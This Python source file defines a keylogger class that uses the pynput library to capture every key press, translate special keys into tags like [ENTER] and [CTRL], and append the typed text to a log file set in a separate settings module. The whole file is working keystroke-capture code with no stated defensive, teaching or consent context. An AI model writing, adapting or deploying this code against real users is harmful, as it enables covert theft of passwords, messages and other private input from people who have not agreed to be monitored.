from pynput.keyboard import Listener, Key
from settings import path, logs_file


class KeyLogger:
    """Keystroke tracking"""
    keys = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
	        'Key.alt': '[ALT]', 'Key.delete': '[DEL]', 'Key.left': '[LEFT ARROW]',
            'Key.right':'[RIGHT ARROW]', 'Key.shift': '[SHIFT]',
            'Key.caps_lock': '[CAPS LK]', 'Key.ctrl': '[CTRL]'}

    def __init__(self):
        self.data = []
        self.count = 0

    def on_press(self, key):
        self.data.append(key)
        self.count += 1

    def on_release(self, key):
        if self.count >= 1:
            self.count = 0
            self.write_file(self.data)
            self.data = []

    def write_file(self, data):
        with open(path + logs_file, 'a') as f:
            for k in data:
                char = str(k)
                if char in self.keys:
                    f.write(self.keys[char])
                if not char in self.keys and not 'Key' in char:
                    f.write(char.replace("'", ""))

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
